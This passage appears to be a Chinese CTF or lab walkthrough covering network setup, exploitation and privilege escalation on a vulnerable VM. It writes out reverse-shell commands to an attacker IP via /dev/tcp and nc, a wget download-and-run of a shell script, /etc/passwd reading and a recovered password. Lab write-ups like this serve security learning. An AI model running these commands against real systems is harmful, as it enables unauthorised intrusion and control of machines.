需要设置虚拟网络，输入“mount -o rw,remount / ”命令，使 / 路径文件系统的可读模式能自由修改。接着查看网卡名称：

这里使用的是ens33，接下来修改网络配置文件：

  • vi /etc/network/interfaces

配置后重启即可。

🍭0x04 漏洞利用

此处想要反弹shell有两种思路，一是使用echo命令直接反弹，二是在服务器部署脚本下载并执行。

🍭法一 echo命令反弹

kali开启监听

nc -lvp 1111

shell执行命令

echo 'bash -i >& /dev/tcp/192.168.20.131/1111 0>&1' | bash
🍭法二 python脚本反弹

在服务器上部署脚本

服务器开启web服务

python -m SimpleHTTPServer 80

shell执行命令

pwd|wget http://192.168.20.131/getshell.py

脚本下载成功

kali开启监听，shell执行脚本

ifconfig|python getshell.py

反弹成功

🍭0x05 提权

cat /etc/passwd 查看用户名：

找到一个带admin的用户，切换到该目录下，查看目录下隐藏文件

发现直接读取为乱码

使用strings命令（用来提取和显示非文本文件中的文本字符串）

发现可以字符，将其拼接，猜测密码为SUPERultimatePASSWORDyouCANTget，文件中还提示了提权命令

提示当前非终端，可以用Python调用本地的shell生成交互式终端：

python -c 'import pty; pty.spawn("/bin/bash")'

获取flag。
